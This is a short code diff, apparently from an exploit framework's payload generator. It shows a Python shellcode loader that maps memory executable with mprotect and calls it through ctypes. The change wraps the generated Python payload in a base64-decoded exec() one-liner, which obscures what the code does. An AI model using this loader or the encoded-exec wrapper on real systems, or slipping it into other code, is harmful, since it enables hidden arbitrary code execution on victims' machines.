@@ -1461,7 +1461,7 @@ else:
   c.mprotect(ptr,len(buf),mmap.PROT_READ|mmap.PROT_EXEC)
   ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
 )
-    python_code
+    "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('#{Rex::Text.encode_base64(python_code)}')[0]))"
   end
 
   def self.to_jsp(exe)
